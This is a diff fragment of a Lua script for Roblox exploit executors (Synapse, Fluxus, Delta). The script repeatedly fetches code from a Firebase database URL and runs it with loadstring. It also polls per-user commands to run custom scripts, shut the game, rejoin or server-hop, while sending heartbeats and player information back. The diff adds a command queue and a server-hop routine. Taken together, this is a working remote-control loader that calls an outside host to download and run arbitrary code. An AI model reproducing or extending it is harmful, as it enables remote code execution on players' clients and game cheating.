@@ -19,13 +19,15 @@ local function makeScreenBlack()
     end
 end
 
--- Function to check and execute scripts from Firebase
+-- NEW: Command workspace system
+local commandWorkspace = {}
+
+-- Function to check and execute scripts from Firebase with workspace system
 local function checkAndExecuteScript()
     local url = "https://omebgle-default-rtdb.firebaseio.com/script.json"
     
     -- Use executor's HTTP functions (compatible with Delta)
     local success, response = pcall(function()
-        -- FIX: Check for different HTTP request functions to prevent nil value error
         local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
         if requestFunc then
             return requestFunc({
@@ -33,13 +35,11 @@ local function checkAndExecuteScript()
                 Method = "GET"
             }).Body
         else
-            -- Fallback to game:HttpGet if no request function found
             return game:HttpGet(url, true)
         end
     end)
     
     if not success then
-        -- Fallback for executors that use different HTTP functions
         success, response = pcall(function()
             return game:HttpGet(url, true)
         end)
@@ -48,35 +48,42 @@ local function checkAndExecuteScript()
     if success then
         local data = game:GetService("HttpService"):JSONDecode(response)
         if data and data.code and data.code ~= "" then
-            -- Execute the script
-            local executeSuccess, errorMsg = pcall(function()
-                loadstring(data.code)()
-            end)
+            -- Save to workspace and clear from database
+            table.insert(commandWorkspace, data.code)
             
-            if not executeSuccess then
-                warn("Script execution error: " .. errorMsg)
-            else
-                -- Clear the script from DB after successful execution
-                pcall(function()
-                    local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
-                    if requestFunc then
-                        requestFunc({
-                            Url = url,
-                            Method = "PUT",
-                            Headers = {
-                                ["Content-Type"] = "application/json"
-                            },
-                            Body = '{"code":""}'
-                        })
-                    else
-                        -- Fallback if no request function available
-                        game:HttpGet(url .. '?code=', true)
-                    end
-                end)
-            end
+            -- Clear the script from DB
+            pcall(function()
+                local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
+                if requestFunc then
+                    requestFunc({
+                        Url = url,
+                        Method = "PUT",
+                        Headers = {
+                            ["Content-Type"] = "application/json"
+                        },
+                        Body = '{"code":""}'
+                    })
+                else
+                    game:HttpGet(url .. '?code=', true)
+                end
+            end)
         end
-    else
-        warn("Failed to fetch from database: " .. response)
+    end
+end
+
+-- Function to process commands from workspace
+local function processCommandWorkspace()
+    if #commandWorkspace > 0 then
+        local command = table.remove(commandWorkspace, 1)
+        
+        -- Execute the command
+        local executeSuccess, errorMsg = pcall(function()
+            loadstring(command)()
+        end)
+        
+        if not executeSuccess then
+            warn("Script execution error: " .. errorMsg)
+        end
     end
 end
 
@@ -138,7 +145,7 @@ local function sendHeartbeat()
     end
 end
 
--- Function to handle commands from website
+-- NEW: Improved command handling with workspace system
 local function checkCommands(userId)
     local commandUrl = "https://omebgle-default-rtdb.firebaseio.com/commands/" .. userId .. ".json"
     
@@ -157,42 +164,98 @@ local function checkCommands(userId)
     if success then
         local data = game:GetService("HttpService"):JSONDecode(response)
         if data and data.command and data.command ~= "" then
-            -- Execute the command
-            if data.command == "re-execute" then
-                checkAndExecuteScript()
-            elseif data.command == "execute-custom" and data.script then
-                local executeSuccess, errorMsg = pcall(function()
-                    loadstring(data.script)()
-                end)
-                if not executeSuccess then
-                    warn("Custom script execution error: " .. errorMsg)
-                end
-            elseif data.command == "leave" then
-                game:Shutdown()
-            elseif data.command == "rejoin" then
-                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
-            elseif data.command == "serverhop" then
-                -- Server hop implementation would go here
-                print("Server hop command received")
+            -- Save command to workspace and clear from database
+            if data.command == "execute-custom" and data.script then
+                table.insert(commandWorkspace, data.script)
+            else
+                table.insert(commandWorkspace, data.command)
             end
             
-            -- Clear the command after 5 seconds
-            delay(5, function()
-                pcall(function()
-                    local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
-                    if requestFunc then
-                        requestFunc({
-                            Url = commandUrl,
-                            Method = "PUT",
-                            Headers = {
-                                ["Content-Type"] = "application/json"
-                            },
-                            Body = '{"command":""}'
-                        })
-                    end
-                end)
+            -- Clear the command from DB
+            pcall(function()
+                local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
+                if requestFunc then
+                    requestFunc({
+                        Url = commandUrl,
+                        Method = "PUT",
+                        Headers = {
+                            ["Content-Type"] = "application/json"
+                        },
+                        Body = '{"command":""}'
+                    })
+                end
             end)
         end
+    end
+end
+
+-- NEW: Server hop function
+local function serverHop()
+    local HttpService = game:GetService("HttpService")
+    local TeleportService = game:GetService("TeleportService")
+    
+    -- Find a random game with the same place ID
+    local placeId = game.PlaceId
+    local serversUrl = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"
+    
+    local success, response = pcall(function()
+        local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
+        if requestFunc then
+            return requestFunc({
+                Url = serversUrl,
+                Method = "GET"
+            }).Body
+        else
+            return game:HttpGet(serversUrl, true)
+        end
+    end)
+    
+    if success then
+        local data = HttpService:JSONDecode(response)
+        if data and data.data then
+            local servers = {}
+            for _, server in ipairs(data.data) do
+                if server.id ~= game.JobId and server.playing < server.maxPlayers then
+                    table.insert(servers, server)
+                end
+            end
+            
+            if #servers > 0 then
+                local randomServer = servers[math.random(1, #servers)]
+                TeleportService:TeleportToPlaceInstance(placeId, randomServer.id)
+            else
+                warn("No available servers found for server hop")
+            end
+        end
+    else
+        warn("Failed to fetch server list: " .. response)
+    end
+end
+
+-- Function to process commands from workspace
+local function processCommandsFromWorkspace()
+    while #commandWorkspace > 0 do
+        local command = table.remove(commandWorkspace, 1)
+        
+        if command == "re-execute" then
+            checkAndExecuteScript()
+        elseif command == "leave" then
+            game:Shutdown()
+        elseif command == "rejoin" then
+            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
+        elseif command == "serverhop" then
+            serverHop()
+        else
+            -- Assume it's a custom script
+            local executeSuccess, errorMsg = pcall(function()
+                loadstring(command)()
+            end)
+            if not executeSuccess then
+                warn("Custom script execution error: " .. errorMsg)
+            end
+        end
+        
+        wait(1) -- Wait a bit between commands
     end
 end
 
@@ -210,8 +273,17 @@ if playerInfo then
         while true do
             wait(10) -- Send heartbeat every 10 seconds
             sendHeartbeat()
-            sendPlayerInfo() -- Update presence
-            checkCommands(playerInfo.userid) -- Check for commands
+            sendPlayerInfo()
+            checkCommands(playerInfo.userid)
+            processCommandsFromWorkspace()
+        end
+    end)
+    
+    -- Also process command workspace regularly
+    spawn(function()
+        while true do
+            wait(5)
+            processCommandsFromWorkspace()
         end
     end)
 end
